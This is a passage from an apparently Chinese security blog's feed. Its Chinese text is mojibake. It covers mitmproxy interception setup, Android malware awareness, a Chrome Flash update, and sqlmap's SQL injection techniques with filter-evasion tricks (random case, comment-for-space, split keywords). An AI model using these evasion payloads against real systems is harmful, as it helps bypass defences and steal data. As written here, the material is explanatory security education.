id="å¯¼å…¥è¯ä¹¦-1"><a href="#å¯¼å…¥è¯ä¹¦-1" class="headerlink" title="å¯¼å…¥è¯ä¹¦"></a>å¯¼å…¥è¯ä¹¦</h4><p>adb push ~&#x2F;.mitmproxy&#x2F;mitmproxy-ca-cert.cer &#x2F;sdcard&#x2F;Download</p><p>è®¾ç½® -&gt;  å®‰å…¨ -&gt; è¯ä¹¦å­˜å‚¨ -&gt; ä»æ‰‹æœºå­˜å‚¨å®‰è£…ï¼Œ é€‰æ‹©ä¸Šä¼ çš„CAè¯ä¹¦ã€‚</p><h4 id="è®¾ç½®ä»£ç†-1"><a href="#è®¾ç½®ä»£ç†-1" class="headerlink" title="è®¾ç½®ä»£ç†"></a>è®¾ç½®ä»£ç†</h4><p>emulator ä¸Šå¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤è¡Œï¼Œè®¾ç½®ä»£ç†ã€‚</p><p>.&#x2F;emulator -avd 7.0_x86 -http-proxy <a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p><p>çœŸå®çš„è®¾å¤‡ä¸Šï¼Œå¯ä»¥é€šè¿‡è®¾ç½® wifi ä»£ç†ï¼Œæˆ–è€…ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¡Œã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> settings <span class="hljs-keyword">put</span> <span class="hljs-keyword">global</span> http_proxy <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8888</span><br>adb <span class="hljs-built_in">reverse</span> tcp:<span class="hljs-number">8888</span> tcp:<span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p>åœ¨ Android ä¸Šè®¾ç½® http å…¨å±€ä»£ç† 127.0.0.1:8888ï¼Œ æœ€åå°† Android çš„ 8888 ç«¯å£è½¬å‘åˆ°æœ¬æœº 8080 ç«¯å£ã€‚</p><h2 id="â˜†-4-é€æ˜æ¨¡å¼"><a href="#â˜†-4-é€æ˜æ¨¡å¼" class="headerlink" title="â˜† 4. é€æ˜æ¨¡å¼"></a>â˜† 4. é€æ˜æ¨¡å¼</h2><p>mitmproxy æ”¯æŒé€æ˜éƒ¨ç½²ï¼Œå…·ä½“çš„æ–¹æ³•å¯ä»¥å‚è€ƒä¸‹é¢çš„æ–‡ç« ã€‚</p><p><a href="https://docs.mitmproxy.org/stable/howto-transparent/">https://docs.mitmproxy.org/stable/howto-transparent/</a></p><h2 id="â˜†-5-ä¿®æ”¹æŠ¥æ–‡å†…å®¹"><a href="#â˜†-5-ä¿®æ”¹æŠ¥æ–‡å†…å®¹" class="headerlink" title="â˜† 5. ä¿®æ”¹æŠ¥æ–‡å†…å®¹"></a>â˜† 5. ä¿®æ”¹æŠ¥æ–‡å†…å®¹</h2><p>github ä¸Šæœ‰å¾ˆå¤šä¾‹å­ï¼Œè¿™æ¬¡æ²¡æœ‰éœ€æ±‚ï¼Œå¯ä»¥å‚è€ƒ</p><p><a href="https://github.com/mitmproxy/mitmproxy/tree/main/examples/addons">https://github.com/mitmproxy/mitmproxy/tree/main/examples/addons</a><br><a href="https://github.com/mitmproxy/mitmproxy/tree/main/examples/contrib">https://github.com/mitmproxy/mitmproxy/tree/main/examples/contrib</a></p><p>å®˜æ–¹æ–‡æ¡£ä¸Šç»™äº†ä¸ªç®€å•ä¾‹å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">response</span>(<span class="hljs-params">flow</span>):<br>    flow.response.headers[<span class="hljs-string">&quot;newheader&quot;</span>] = <span class="hljs-string">&quot;foo&quot;</span><br></code></pre></td></tr></table></figure><p>ç»™httpå“åº”æŠ¥æ–‡çš„å¤´éƒ¨æ·»åŠ ä¸€ä¸ª newheader çš„å­—æ®µã€‚</p><h2 id="â˜†-6-socks-æ¨¡å¼"><a href="#â˜†-6-socks-æ¨¡å¼" class="headerlink" title="â˜† 6. socks æ¨¡å¼"></a>â˜† 6. socks æ¨¡å¼</h2><p>mitmproxy -m socks5</p><p>ä½œä¸º SOCKS5 proxy server ä½¿ç”¨</p><h2 id="â˜†-7-æ€»ç»“"><a href="#â˜†-7-æ€»ç»“" class="headerlink" title="â˜† 7. æ€»ç»“"></a>â˜† 7. æ€»ç»“</h2><p>è¿™é‡Œè¯´åˆ°çš„å†…å®¹éå¸¸å°‘ï¼Œmitmproxyè¿™ä¸ªå·¥å…·è¿˜æ˜¯å¾ˆå¼ºå¤§çš„ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://www.usmacd.com/2021/09/01/Android_SSL_Pinning/">https://www.usmacd.com/2021/09/01/Android_SSL_Pinning/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºæ¶æ„ Android è½¯ä»¶çš„é‚£äº›äº‹</title>
    <link href="/cn/android_malware/"/>
    <url>/cn/android_malware/</url>
    
    <content type="html"><![CDATA[<p>  è¿‘å¹´æ¥ï¼ŒAndroidæ‰‹æœºå¹³å°ä¸Šçš„æ¶æ„Appå‘ˆä¸æ–­ä¸Šå‡çš„è¶‹åŠ¿ï¼Œæ ¹æ®G DATAçš„æ•°æ®ä»…2015å¹´ ç¬¬ä¸€å­£åº¦å‘ç°äº†440267 ç§æ–°çš„å®‰å“æ¶æ„è½¯ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå…¨çƒèŒƒå›´å†…æ¯18ç§’å°±æœ‰ä¸€ä¸ªæ–°çš„æ¶æ„è½¯ä»¶è¢«å‘ç°ã€‚è€Œå¤©æœç”±äºGoogleè¢«å°çš„åŸå› ï¼Œæ›´æ˜¯ä½¿æ¶æ„è½¯ä»¶çš„ä¼ æ’­æ›´åŠ çŒ–ç—ã€‚Google Play store ä¸ºäº†ä¿è¯Androidç”¨æˆ·çš„å®‰å…¨åšäº†å¤§é‡çš„åŠªåŠ›ï¼Œå’Œå›½å†…çš„ä¸€äº›ç¬¬ä¸‰æ–¹åº”ç”¨å¸‚åœºç›¸æ¯”å®‰å…¨ä¸€äº›çš„ã€‚</p><p>   é‡æ‰“åŒ…æ˜¯Android Appä¸»æµçš„ä¼ æ’­æ–¹å¼ä¹‹ä¸€ï¼Œå’Œä»¥å‰å•ç‹¬çš„æ¶æ„Appä¸åŒï¼Œé‡æ‰“åŒ…çš„è½¯ä»¶ åœ¨åˆæ³•æ­£å¸¸çš„Appä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œè¿·æƒ‘æ€§æå¼ºï¼Œä¸€èˆ¬ç”¨æˆ·è§‰å¯Ÿä¸å‡ºä»€ä¹ˆä¸åŒã€‚è€Œé‡æ‰“åŒ…é€‰å– çš„Appä¹Ÿå¤§å¤šæ˜¯éå¸¸æµè¡Œçš„Appï¼Œå¦‚æ„¤æ€’çš„å°é¸Ÿä¹‹ç±»,è¿™äº›éƒ½åœ¨åœ°ä¸‹å¸‚åœºéšç§˜çš„è¿›è¡Œç€ã€‚é‡æ‰“åŒ… Appç„¶åä¸Šä¼ ç¬¬ä¸‰æ–¹Appåº”ç”¨å¸‚åœºï¼Œç¬¬ä¸‰æ–¹å¸‚åœºæŠŠå…³ä¸ä¸¥æ ¼çš„è¯ï¼Œè¿™äº›æ’å…¥äº†æ¶æ„ä»£ç çš„App å°±å¯ä»¥ä¸‹è½½å®‰è£…äº†ã€‚</p><p>  é™¤äº†é‡æ‰“åŒ…è½¯ä»¶ï¼Œå½©ä¿¡ä¹Ÿæ˜¯Android æ¶æ„Appä¼ æ’­çš„ä¸»è¦æ–¹å¼ï¼Œå’Œä»¥å‰QQçš„æ¶ˆæ¯å°¾å·´ç±»ä¼¼å‘ä¸€äº›å¥‡æ€ªçš„è¯ï¼Œåé¢åŠ ä¸ŠçŸ­é“¾æ¥ã€‚çŸ­é“¾æ¥å°±æ˜¯ç»è¿‡å‹ç¼©çš„é“¾æ¥ï¼Œæ²¡æ³•ä¸€äº›çœ‹å‡ºåŸå§‹çš„é“¾æ¥ï¼Œç‚¹å‡»åä¼šè‡ªåŠ¨ä¸‹è½½æ¶æ„Appã€‚è‡­åæ˜­è‘—çš„â€œç›¸å†Œâ€å°±æ˜¯é€šè¿‡è¿™ç§æ–¹å¼ä¼ æ’­ï¼ŒçŸ­ä¿¡çš„å†…å®¹æ˜¯ï¼šå°æ˜ï¼Œä½ è¿˜è®°å¾—è¿™äº›ç…§ç‰‡å—?  t.cn&#x2F;xyz1 æ³¨æ„è¿™é‡Œçš„åå­—å°æ˜æ˜¯æ­£ç¡®çš„ï¼Œç›¸å†Œå·å–äº†å¤§é‡çš„æ‰‹æœºé€šè®¯å½•ï¼ŒæŒ‰ç…§é€šè®¯å½•çš„åå­—æ¥å‘é€ï¼Œè¿·æƒ‘æ€§å¤§å¤§å¢å¼ºäº†ã€‚</p><p>   è¿˜æœ‰å€¼å¾—å¤§å®¶æ³¨æ„çš„æ˜¯ï¼Œä¸€å®šè¦è­¦æƒ•ç”³è¯·è®¾å¤‡ç®¡ç†å‘˜æƒé™çš„Appï¼Œè®¾å¤‡ç®¡ç†å‘˜å¯ä»¥åšå¾ˆå¤šé«˜æƒé™çš„äº‹ï¼Œæ¯”å¦‚ä¿®æ”¹è®¾å¤‡å¯†ç ï¼Œæ“¦æ‰æ•°æ®ç­‰æ“ä½œï¼ŒAndroidæ‰‹æœºçš„å‹’ç´¢è½¯ä»¶å°±æ˜¯ä¿®æ”¹äº†è®¾å¤‡çš„å¯†ç ï¼Œç¦æ­¢æ‰‹æœºä¸»äººè¿›å…¥æ‰‹æœºï¼Œè€Œè¿›è¡Œå‹’ç´¢çš„ï¼Œæœ€è¿‘è¿™ç±»è½¯ä»¶çš„æ•°ç›®å¢åŠ å¾ˆå¿«ï¼Œå¤§å®¶ä¸€å®šè¦æ³¨æ„ã€‚</p><p>  ä¸Šé¢è¯´äº†å¾ˆå¤šAndroidæ¶æ„è½¯ä»¶ç›¸å…³çš„å†…å®¹ï¼Œä¹Ÿç»™å¤§å®¶ä¸€äº›å®‰å…¨å»ºè®®,æé«˜äº†å®‰å…¨æ„è¯†ä¹Ÿå°±ä¸å®¹æ˜“ä¸­æ‹›äº†ã€‚</p><ol><li>å°½é‡åœ¨Google play æˆ–è€…å®˜æ–¹ç½‘ç«™ä¸‹è½½APPï¼Œä¸è¦ç¬¬ä¸‰æ–¹åº”ç”¨å¸‚åœºéšæ„ä¸‹è½½</li><li>ä¸è¦éšæ„ç‚¹å‡»ä¸æ˜é“¾æ¥</li><li>å¯¹äºç”³è¯·è®¾å¤‡ç®¡ç†å‘˜çš„Appï¼Œä¿æŒé«˜åº¦è­¦æƒ•</li></ol><p>  æœ€åæ•™å¤§å®¶ä¸€æ‹›æ€¥æ•‘ï¼Œè®¸å¤šAndroidæ‰‹æœºä¹Ÿæœ‰å®‰å…¨æ¨¡å¼ï¼Œå®‰å…¨æ¨¡å¼åªåŠ è½½å‡ºå‚åº”ç”¨ï¼Œè¿›å…¥äº†å®‰å…¨æ¨¡å¼ï¼Œåˆ é™¤æ¶æ„è½¯ä»¶ï¼Œå¯èƒ½å¯ä»¥æŒ½æ•‘ä½ çš„æ‰‹æœº :)</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Google Chrome æµè§ˆå™¨ Adobe Flash Player å‡çº§</title>
    <link href="/cn/chrome_flash_update/"/>
    <url>/cn/chrome_flash_update/</url>
    
    <content type="html"><![CDATA[<p>æŸä¸€å¤©çªç„¶å‘ç°ç½‘é¡µä¸­flashå·²ç»ä¸èƒ½æ­£å¸¸æ˜¾ç¤ºäº†ï¼ˆæˆ‘ä¸€èˆ¬éƒ½ç¦ç”¨ï¼‰ï¼Œæ˜¾ç¤º out of data é”™è¯¯ã€‚</p><p>è®¿é—® chrome:&#x2F;&#x2F;components&#x2F; å¯ä»¥å‡çº§ Adobe Flash Player</p><p>Adobe Flash Player - æ£€æŸ¥æ›´æ–°ï¼Œ å¤±è´¥ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªå‘ï¼Œæ’ä»¶ä¸­çš„ä»£ç†è®¾ç½®æ˜¯æ— æ³•å½±å“<br>chrome å†…éƒ¨ç¨‹åºçš„ï¼Œå¿…é¡»è®¾ç½®ç¯å¢ƒå˜é‡æˆ–è€…ç›´æ¥ä½¿ç”¨å‘½ä»¤è¡Œæ¥è®¾ç½®å…¨å±€ä»£ç†ã€‚</p><p>google-chrome â€”proxy-server&#x3D;â€socks:&#x2F;&#x2F;127.0.0.1:9999â€</p><p>é‡æ–°æ£€æŸ¥æ›´æ–°ï¼Œå¯ä»¥æˆåŠŸæ›´æ–°äº†ï¼Œé‡å¯åç”Ÿæ•ˆäº†ï¼Œå·²ç»ä¸æŠ¥ out of data é”™è¯¯äº†ã€‚ä¸ºäº†ä¿é™©<br>æŠŠç³»ç»Ÿä¸­flash playerä¹Ÿç»™å‡çº§ï¼Œæ‰“å¼€ç½‘é¡µ <a href="https://get.adobe.com/flashplayer/otherversions/">https://get.adobe.com/flashplayer/otherversions/</a></p><p>step 1 é€‰Linux (64 bit), step 2 é€‰ yumï¼Œä¸‹è½½åå®‰è£…ï¼Œåç»­å¯ä»¥ä½¿ç”¨dnf å‡çº§äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap ä¸­çš„ SQL Injection æ£€æµ‹æŠ€æœ¯</title>
    <link href="/cn/sqlmap_sql_injection/"/>
    <url>/cn/sqlmap_sql_injection/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/henices/sqli">https://github.com/henices/sqli</a><br><a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)">https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)</a></p><h2 id="åŸºäºä¿¡é“çš„-sql-injection-åˆ†ç±»"><a href="#åŸºäºä¿¡é“çš„-sql-injection-åˆ†ç±»" class="headerlink" title="åŸºäºä¿¡é“çš„ sql injection åˆ†ç±»"></a>åŸºäºä¿¡é“çš„ sql injection åˆ†ç±»</h2><h3 id="Inband"><a href="#Inband" class="headerlink" title="Inband"></a>Inband</h3><p>SQLä»£ç æ³¨å…¥å’ŒSQL injection ç»“æœçš„è·å–åœ¨åŒä¸€é¢‘é“(e.g. æµè§ˆå™¨), è·å¾—çš„æ•°æ®ç›´æ¥æ˜¾ç¤ºåœ¨åº”ç”¨ç¨‹åºé¡µé¢çš„æ­£å¸¸è¾“å‡ºæˆ–è€…é”™è¯¯ä¿¡æ¯ä¸­,è¿™æ˜¯æœ€ç®€å•çš„æ”»å‡»ç±»å‹ã€‚</p><h3 id="Out-of-band"><a href="#Out-of-band" class="headerlink" title="Out-of-band"></a>Out-of-band</h3><p>SQLæŸ¥è¯¢æ•°æ®çš„ä¼ è¾“ä½¿ç”¨ä¸åŒçš„é¢‘é“(e.g HTTPï¼ŒDNS)ï¼Œ è¿™æ˜¯ä»æ•°æ®åº“ä¸­è·å–å¤§é‡æ•°æ®ç®€å•çš„æ–¹æ³•ã€‚</p><h3 id="Inferential"><a href="#Inferential" class="headerlink" title="Inferential"></a>Inferential</h3><p>æ²¡ç”¨çœŸå®æœ‰ç”¨çš„æ•°æ®ä¼ è¾“ï¼Œä½†æ˜¯æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹å®šçš„è¯·æ±‚ï¼Œè§‚å¯Ÿæ•°æ®åº“æœåŠ¡å™¨çš„è¿”å›çš„ç»“æœçš„è¡Œä¸ºé‡å»ºä¿¡æ¯ã€‚</p><h2 id="åŸºäº-sql-inject-æ£€æµ‹æŠ€æœ¯çš„åˆ†ç±»"><a href="#åŸºäº-sql-inject-æ£€æµ‹æŠ€æœ¯çš„åˆ†ç±»" class="headerlink" title="åŸºäº sql inject æ£€æµ‹æŠ€æœ¯çš„åˆ†ç±»"></a>åŸºäº sql inject æ£€æµ‹æŠ€æœ¯çš„åˆ†ç±»</h2><h3 id="boolean-based-blind-SQL-injection"><a href="#boolean-based-blind-SQL-injection" class="headerlink" title="boolean-based blind SQL injection"></a>boolean-based blind SQL injection</h3><p>ä¹Ÿè¢«ç§°ä¸ºæ¨ç†SQLæ³¨å…¥ï¼šSqlMapæ›¿æ¢æˆ–è¿½åŠ HTTPè¯·æ±‚ä¸­å—å½±å“çš„å‚æ•°ï¼Œä¸€ä¸ªæœ‰æ•ˆçš„SQLè¯­å¥å­—ç¬¦ä¸²åŒ…å« SELECT å­è¯­å¥ï¼Œæˆ–ä»»ä½•å…¶ä»–ç”¨æˆ·è¦æ£€ç´¢è¾“å‡ºçš„SQLè¯­å¥ã€‚å¯¹äºæ¯ä¸ªHTTPå“åº”ï¼Œå°†å…¶ headers&#x2F;bodyå’ŒåŸå§‹è¯·æ±‚çš„åšæ¯”è¾ƒï¼Œè¯¥å·¥å…·ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°åˆ†æçš„æ³¨å…¥è¯­å¥çš„è¾“å‡ºã€‚å¦å¤–ï¼Œç”¨æˆ·å¯ä»¥æä¾›ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ­£ç¡®çš„é¡µé¢ã€‚ä½¿ç”¨SqlMapå®ç°çš„äºŒåˆ†ç®—æ³•æ¥å®æ–½æ‰§è¡Œæ­¤æŠ€æœ¯å¯ä»¥è·å–ä¸ƒä¸ªæœ€å¤§çš„æ¯ä¸ªHTTPè¯·æ±‚çš„è¾“å‡ºçš„æ¯ä¸€ä¸ªå­—ç¬¦ã€‚å‡¡ä¸å±äºè¾“å‡ºçº¯æ–‡æœ¬çº¯å­—ç¬¦é›†ï¼ŒSqlMapå°†é€‚åº”ä¸æ›´å¤§èŒƒå›´çš„ç®—æ³•æ¥æ£€æµ‹è¾“å‡ºã€‚</p><h3 id="error-based-SQL-injection"><a href="#error-based-SQL-injection" class="headerlink" title="error-based SQL injection"></a>error-based SQL injection</h3><p>sqlmapæ›¿æ¢æˆ–è€…è¿½åŠ å—å½±å“çš„HTTPå‚æ•°ä¸€ä¸ªç‰¹å®šæ•°æ®çš„è¯­æ³•é”™è¯¯çš„SQLè¯­å¥ï¼Œåˆ†æHTTP å“åº”headerå’Œbodyï¼ŒæŸ¥è¯¢DBMSé”™è¯¯ä¿¡æ¯ä¸­æ˜¯å¦åŒ…å«æ³¨å…¥çš„é¢„å…ˆå®šä¹‰çš„å­—ç¬¦ä¸²é“¾ï¼Œå¹¶ä¸”SQLè¯­å¥çš„è¾“å‡ºåœ¨å­—ç¬¦ä¸²é“¾çš„ä¸­é—´.è¿™ç§æŠ€æœ¯ä»…åœ¨webåº”ç”¨ç¨‹åºè¢«é…ç½®æˆæ³„æ¼åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿé”™è¯¯ä¿¡æ¯æ—¶æœ‰æ•ˆã€‚</p><h3 id="time-based-blind-or-stacked-queries"><a href="#time-based-blind-or-stacked-queries" class="headerlink" title="time-based blind or stacked queries"></a>time-based blind or stacked queries</h3><p>ä¹Ÿè¢«ç§°ä¸ºå…¨ç›²SQLæ³¨å…¥ï¼šSqlMapæ›¿æ¢æˆ–è¿½åŠ HTTPè¯·æ±‚ä¸­å—å½±å“çš„å‚æ•°ï¼Œæ„é€ ä¸€ä¸ªæœ‰æ•ˆçš„SQLè¯­å¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ªæŸ¥è¯¢ï¼Œä½¿åç«¯DBMS sleepå‡ ç§’é’Ÿã€‚å¯¹äºæ¯ä¸ªHTTPå“åº”ï¼Œæ¯”è¾ƒå…¶å“åº”æ—¶é—´ä¸åŸå§‹è¯·æ±‚çš„HTTPå“åº”æ—¶é—´ï¼Œè¯¥å·¥å…·ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°åˆ†æçš„æ³¨å…¥è¯­å¥çš„è¾“å‡ºã€‚å’Œboolean-basedæŠ€æœ¯ä¸€æ ·ï¼ŒåŒæ ·åº”ç”¨äº†äºŒåˆ†ç®—æ³•(bisection algorithm)ã€‚</p><h3 id="UNION-query-SQL-injection"><a href="#UNION-query-SQL-injection" class="headerlink" title="UNION query SQL injection"></a>UNION query SQL injection</h3><p>SqlMap è¿½åŠ å—å½±å“çš„å‚æ•°ä¸€ä¸ªä»¥UNION ALL SELECTå¼€å§‹çš„æœ‰æ•ˆçš„SQLè¯­å¥å­—ç¬¦ä¸²ã€‚è¿™ç§æŠ€æœ¯å½“Webåº”ç”¨ç¨‹åºé¡µé¢å†…å°†SELECTè¯­å¥çš„åŒä¸€å‘¨æœŸè¾“å‡ºï¼Œæˆ–è€…ç±»ä¼¼çš„ï¼Œç½‘é¡µä¸Šçš„å†…å®¹ä¸­æ˜¾ç¤ºæŸ¥è¯¢ç»“æœçš„æ¯ä¸€è¡Œæ—¶æœ‰æ•ˆã€‚SqlMapæ˜¯è¿˜å¯ä»¥åˆ©ç”¨éƒ¨åˆ†UNION æŸ¥è¯¢çš„SQLæ³¨å…¥æ¼æ´ï¼Œå½“SQLè¯­å¥çš„è¾“å‡ºä¸æ˜¯åœ¨ä¸€ä¸ªå‘¨æœŸå†…çš„ï¼Œåœ¨æ„é€ çš„åŒºåŸŸå†…åªæœ‰åœ¨æŸ¥è¯¢è¾“å‡ºçš„ç¬¬ä¸€é¡¹è¢«æ˜¾ç¤ºã€‚</p><h3 id="Stacked-queries-SQL-injection"><a href="#Stacked-queries-SQL-injection" class="headerlink" title="Stacked queries SQL injection"></a>Stacked queries SQL injection</h3><p>ä¹Ÿè¢«ç§°ä¸ºå¤šè¯­å¥SQLæ³¨å…¥ï¼ˆmultiple statements SQL injectionï¼‰ï¼šSqlMap æµ‹è¯• Web åº”ç”¨ç¨‹åºæ˜¯å¦æ”¯æŒæ‰¹é‡å æŸ¥è¯¢, ç„¶åï¼Œå®ƒæ”¯æŒçš„æƒ…å†µä¸‹ï¼Œå®ƒé™„åŠ åˆ°HTTPè¯·æ±‚ä¸­å—å½±å“çš„å‚æ•°ï¼Œä¸€ä¸ªåˆ†å·ï¼ˆ;ï¼‰ éšåçš„SQLè¯­å¥ä¼šè¢«æ‰§è¡Œã€‚è¿™ç§æŠ€æœ¯åœ¨æ‰§è¡Œ SELECTä»¥å¤–çš„SQLè¯­å¥æ—¶éå¸¸æœ‰ç”¨ï¼Œæ ¹æ®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ä¸åŒç”¨æˆ·å’Œä¼šè¯ç‰¹æƒ,æ•°æ®å®šä¹‰å’Œæ•°æ®æ“ä½œSQLè¯­å¥å¯èƒ½å¯¼è‡´æ–‡ä»¶ç³»ç»Ÿçš„è¯»å†™è®¿é—®å’Œæ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„ã€‚</p><h2 id="SQL-Injection-æ£€æµ‹çš„é€ƒé€¸æŠ€æœ¯"><a href="#SQL-Injection-æ£€æµ‹çš„é€ƒé€¸æŠ€æœ¯" class="headerlink" title="SQL Injection æ£€æµ‹çš„é€ƒé€¸æŠ€æœ¯"></a>SQL Injection æ£€æµ‹çš„é€ƒé€¸æŠ€æœ¯</h2><h3 id="éšæœºå¤§å°å†™"><a href="#éšæœºå¤§å°å†™" class="headerlink" title="éšæœºå¤§å°å†™"></a>éšæœºå¤§å°å†™</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">INSERT</span> <span class="hljs-operator">=</span>&gt; InsERt<br></code></pre></td></tr></table></figure><p>æ”¯æŒçš„æ•°æ®åº“ç±»å‹ï¼š</p><table><thead><tr><th>æ•°æ®åº“</th><th>æ˜¯å¦æ”¯æŒ</th></tr></thead><tbody><tr><td>MSSQL</td><td>æ”¯æŒ</td></tr><tr><td>MySQL</td><td>æ”¯æŒ</td></tr><tr><td>PostgreSQL</td><td>æ”¯æŒ</td></tr><tr><td>Oracle</td><td>æ”¯æŒ</td></tr></tbody></table><h3 id="ç©ºæ ¼ç”¨æ³¨é‡Šæ›¿æ¢"><a href="#ç©ºæ ¼ç”¨æ³¨é‡Šæ›¿æ¢" class="headerlink" title="ç©ºæ ¼ç”¨æ³¨é‡Šæ›¿æ¢"></a>ç©ºæ ¼ç”¨æ³¨é‡Šæ›¿æ¢</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>id<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span>users<br></code></pre></td></tr></table></figure><p>æ”¯æŒçš„æ•°æ®åº“ç±»å‹ï¼š</p><table><thead><tr><th>æ•°æ®åº“</th><th>æ˜¯å¦æ”¯æŒ</th></tr></thead><tbody><tr><td>MSSQL</td><td>æ”¯æŒ</td></tr><tr><td>MySQL</td><td>æ”¯æŒ</td></tr><tr><td>PostgreSQL</td><td>æ”¯æŒ</td></tr><tr><td>Oracle</td><td>æ”¯æŒ</td></tr><tr><td>Access</td><td>ä¸æ”¯æŒ</td></tr></tbody></table><p>Oracle 10g æµ‹è¯•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-operator">*</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span> v$version;<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">BANNER</span><br><span class="hljs-section">----------------------------------------------------------------</span><br>Oracle Database 10g Enterprise Edition Release 10.1.0.3.0 - Prod<br>PL/SQL Release 10.1.0.3.0 - Production<br>CORE10.1.0.3.0Production<br>TNS for Linux: Version 10.1.0.3.0 - Production<br>NLSRTL Version 10.1.0.3.0 - Production<br></code></pre></td></tr></table></figure><p>PostgreSQL:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">postgres<span class="hljs-operator">=</span># <span class="hljs-keyword">select</span><span class="hljs-comment">/*abc*/</span>version();<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">                                                               version                                                                </span><br><span class="hljs-section">--------------------------------------------------------------------------------------------------------------------</span><br><span class="hljs-code"> PostgreSQL 8.1.4 on i686-pc-linux-gnu, compiled by GCC i686-pc-linux-gnu-gcc (GCC) 3.4.6 (Gentoo 3.4.6-r1, ssp-3.4.5-1.0, pie-8.7.9)</span><br></code></pre></td></tr></table></figure><h3 id="éšæœºæ³¨é‡Š"><a href="#éšæœºæ³¨é‡Š" class="headerlink" title="éšæœºæ³¨é‡Š"></a>éšæœºæ³¨é‡Š</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">IN</span><span class="hljs-comment">/**/</span>S<span class="hljs-comment">/**/</span>ERT<br></code></pre></td></tr></table></figure><p>æœ¬èº«è¯­æ³•ä¸æ”¯æŒï¼Œä½†å¯ä»¥å¯¹ä»˜ä¸æ­£ç¡®çš„è¿‡æ»¤.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">postgres<span class="hljs-operator">=</span># selec<span class="hljs-comment">/**/</span>t version();<br></code></pre></td></tr></table></figure><p>ERROR:  syntax error at or near â€œselecâ€ åœ¨å­—ç¬¦ 1<br>ç¬¬ 1 è¡Œ: selec&#x2F;**&#x2F;t version();</p><p>Oracle:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> sel<span class="hljs-comment">/**/</span>ect v$version;<br></code></pre></td></tr></table></figure><p>SP2-0734: unknown command beginning â€œsel&#x2F;**&#x2F;ectâ€¦â€ - rest of line ignored.</p><h3 id="ç©ºæ ¼ç”¨-æ›¿æ¢"><a href="#ç©ºæ ¼ç”¨-æ›¿æ¢" class="headerlink" title="ç©ºæ ¼ç”¨+æ›¿æ¢"></a>ç©ºæ ¼ç”¨+æ›¿æ¢</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 